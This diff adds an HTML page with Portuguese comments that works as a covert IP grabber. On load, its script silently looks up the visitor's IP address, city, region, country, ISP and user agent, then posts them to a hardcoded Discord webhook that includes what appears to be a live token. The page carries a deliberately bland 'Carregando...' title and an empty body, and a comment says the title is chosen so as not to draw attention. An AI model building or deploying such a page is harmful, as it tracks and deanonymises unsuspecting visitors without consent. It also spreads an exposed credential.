@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title> <!-- Título genérico para não chamar atenção -->
+</head>
+<body>
+    <h1></h1>
+    <p></p>
+
+    <script>
+        // URL do seu Webhook do Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542344832817823794/rpnzy3a7n1WlSyjHT4ozcd0DaN9BVufEDRLuDbbXDWe_cpLroDqhJCBzATv3llqjKqk_';
+
+        async function captureData() {
+            try {
+                // 1. Obtendo o IP e informações de geolocalização
+                // Usamos a ipapi.co para obter dados detalhados
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // 2. Preparando a mensagem para o Discord
+                const payload = {
+                    embeds: [{
+                        title: "🚨 Novo IP Capturado!",
+                        color: 0xFF0000, // Vermelho
+                        fields: [
+                            { name: "IP", value: ipData.ip || "Não identificado", inline: true },
+                            { name: "Cidade", value: ipData.city || "N/A", inline: true },
+                            { name: "Região", value: ipData.region || "N/A", inline: true },
+                            { name: "País", value: ipData.country_name || "N/A", inline: true },
+                            { name: "Provedor (ISP)", value: ipData.org || "N/A", inline: false },
+                            { name: "User Agent", value: navigator.userAgent, inline: false }
+                        ],
+                        footer: { text: "Captura realizada via DeepHat Protocol" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 3. Enviando para o Webhook via POST
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log("Dados enviados com sucesso.");
+
+            } catch (error) {
+                console.error("Erro na captura:", error);
+            }
+        }
+
+        // Executa a função assim que a página carrega
+        window.onload = captureData;
+    </script>
+</body>
+</html>
